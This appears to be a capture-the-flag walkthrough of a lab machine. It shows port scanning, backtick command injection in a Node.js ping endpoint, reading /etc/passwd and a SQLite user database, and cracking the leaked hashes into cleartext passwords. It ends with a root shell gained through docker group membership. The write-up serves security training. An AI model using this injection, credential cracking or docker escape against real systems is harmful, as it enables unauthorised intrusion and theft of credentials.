
```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
8081/tcp open  http    Node.js Express framework
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

anonymous ftp not allowed.


gobuster
```
/auth                 (Status: 200) [Size: 39]
/ping                 (Status: 500) [Size: 1094]
            
```

/ping
```
TypeError: Cannot read property 'replace' of undefined
    at app.get (/home/www/api/index.js:45:29)
    at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/www/api/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/www/api/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)
    at /home/www/api/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/www/api/node_modules/express/lib/router/index.js:335:12)
    at next (/home/www/api/node_modules/express/lib/router/index.js:275:10)
    at cors (/home/www/api/node_modules/cors/lib/index.js:188:7)
    at /home/www/api/node_modules/cors/lib/index.js:224:17
```

`http://10.10.1.197:8081/ping?ip='` gives the error ...
```
/bin/sh: 1: Syntax error: Unterminated quoted string
```

so this appears like it can be injectable. I tried `'pwd'` and `"pwd"` to no avail; however, using backticks in 
```
http://10.10.1.197:8081/ping?ip=`pwd`
```

gives me `ping: /home/www/api: Temporary failure in name resolution`.

injecting `ls` gives us the name of the database being used `utech.db.sqlite`

`cat /etc/passwd` -> `www:x:1002:1002::/home/www:/bin/sh:`

`cat utech.db.sqlite` -> ` ) ���(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded`

using john the ripper to crack the password using `rockyou.txt` as wordlist yields `r00t:n100906` and `admin: mrsheafy`. SO far the admin password appears to be incorrect.

```
r00t@ultratech-prod:~$ sudo -l
[sudo] password for r00t: 
Sorry, user r00t may not run sudo on ultratech-prod.
```

 well that is a let down. 
 
 ```
 r00t@ultratech-prod:/$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)

 ```
 
 
 ```
 r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
Unable to find image 'alpine:latest' locally
docker: Error response from daemon: Get https://registry-1.docker.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers).

 ```
 
 ```
 r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
# whoami
root
 ```
